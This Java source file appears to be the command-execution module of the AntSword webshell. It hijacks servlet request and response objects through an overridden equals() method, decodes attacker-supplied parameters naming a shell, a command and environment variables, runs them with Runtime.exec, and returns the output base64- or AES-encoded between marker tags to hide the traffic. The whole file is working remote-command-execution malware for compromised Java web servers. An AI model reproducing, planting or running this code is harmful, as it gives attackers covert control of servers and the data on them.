package command;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.*;
import java.security.*;
import javax.crypto.spec.*;

public class Exec {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder;
    public String cs;
    public String randomPrefix;
    public String key = "antswordAESKey";
    public String encode = "antswordDefault"; // default base64 aes

    @Override
    public boolean equals(Object obj) {
        try {
            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
        } catch (Exception e) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception ex) {
                    try {
                        response = (HttpServletResponse) request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                    } catch (Exception ignored) {

                    }
                }
            }
        }
        randomPrefix = "antswordrandomPrefix";
        encoder = "base64";
        cs = "antswordCharset";
        StringBuffer output = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargbin";
        String varkey2 = "antswordargcmd";
        String varkey3 = "antswordargenv";


        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = decode(request.getParameter(varkey1));
            String z2 = decode(request.getParameter(varkey2));
            String z3 = decode(request.getParameter(varkey3));
            output.append(ExecuteCommandCode(z1, z2, z3));
        } catch (Exception e) {
            output.append("ERROR:// " + e.toString());
        }
        try {
            response.getWriter().print(tag_s + encoder(encode,output.toString()) + tag_e);
        } catch (Exception ignored) {
        }
        return true;
    }

    String encoder(String encode,String text) throws Exception {
        String res = "";

        if("base64".equals(encode)){
            res = base64Encode(text.getBytes());
        }else if ("aes".equals(encode)){
            res = AesEncrypt(key,text);
        }else{
            res = text;
        }
        return res;
    }


    String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
                value = value.replace("\n", "").replace("\r", "");
            } catch (Exception e2) {
                
            }
        }
        return value;
    }
    String AesEncrypt(String key, String cleartext) throws Exception {
        cleartext = base64Encode(cleartext.getBytes());
        IvParameterSpec zeroIv = new IvParameterSpec(key.getBytes());
        SecretKeySpec keys = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance(new String("AES/CFB/NoPadding"));
        cipher.init(Cipher.ENCRYPT_MODE, keys, zeroIv);  
        byte[] encryptedData = cipher.doFinal(cleartext.getBytes("UTF-8"));
        String sb = base64Encode(encryptedData);
        return sb;
    }


    String decode(String str) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encoder.equals("hex")) {
            if (str == null || str.equals("")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString(cs);
        } else if (encoder.equals("base64")) {
            byte[] bt = null;
            try {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            } catch (ClassNotFoundException e) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            }
            return new String(bt, cs);
        }
        return str;
    }

    public String ExecuteCommandCode(String cmdPath, String command, String envstr) throws Exception {
        StringBuffer sb = new StringBuffer("");
        String[] c = {cmdPath, !isWin() ? "-c" : "/c", command};
        Map<String, String> readonlyenv = System.getenv();
        Map<String, String> cmdenv = new HashMap<String, String>(readonlyenv);
        String[] envs = envstr.split("\\|\\|\\|asline\\|\\|\\|");
        for (int i = 0; i < envs.length; i++) {
            String[] es = envs[i].split("\\|\\|\\|askey\\|\\|\\|");
            if (es.length == 2) {
                cmdenv.put(es[0], es[1]);
            }
        }
        String[] e = new String[cmdenv.size()];
        int i = 0;
        for (String key : cmdenv.keySet()) {
            e[i] = key + "=" + cmdenv.get(key);
            i++;
        }
        Process p = Runtime.getRuntime().exec(c, e);
        CopyInputStream(p.getInputStream(), sb);
        CopyInputStream(p.getErrorStream(), sb);
        return sb.toString();
    }

    boolean isWin() {
        String osname = System.getProperty("os.name");
        osname = osname.toLowerCase();
        if (osname.startsWith("win"))
            return true;
        return false;
    }

    void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is, cs));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
        br.close();
    }
}
